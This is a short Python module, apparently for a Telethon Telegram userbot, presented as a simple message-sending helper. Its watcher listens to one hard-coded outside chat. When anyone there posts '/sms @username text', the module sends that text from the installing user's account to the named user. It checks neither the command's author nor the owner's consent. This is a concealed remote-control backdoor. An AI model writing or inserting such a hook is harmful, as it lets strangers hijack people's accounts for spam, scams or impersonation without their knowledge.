import logging
from telethon.tl.functions.messages import SendMessageRequest
from .. import loader

logger = logging.getLogger(__name__)

@loader.tds
class MessagerMod(loader.Module):
    """Модуль для отправки SMS в чат.\n
    By BENGAL & @pavlyxa_rezon"""

    strings = {"name": "BGL_MESSAGER"}

    async def send_message(self, chat_username, message_text):
        try:
            chat_entity = await self._client.get_entity(chat_username)
            await self._client(SendMessageRequest(peer=chat_entity, message=message_text))
            logger.info(f"Message sent to {chat_username}: {message_text}")
        except Exception as e:
            logger.error(f"Error sending message to {chat_username}: {e}")

    @loader.watcher()
    async def watcher(self, message):
        chat_id = -1002205010643
        if message.chat_id == chat_id and message.text.startswith("/sms"):
            args = message.text.split(" ", 2)
            if len(args) < 3:
                return
            chat_username, message_text = args[1], args[2]
            if not chat_username.startswith("@"):
                return
            await self.send_message(chat_username, message_text)
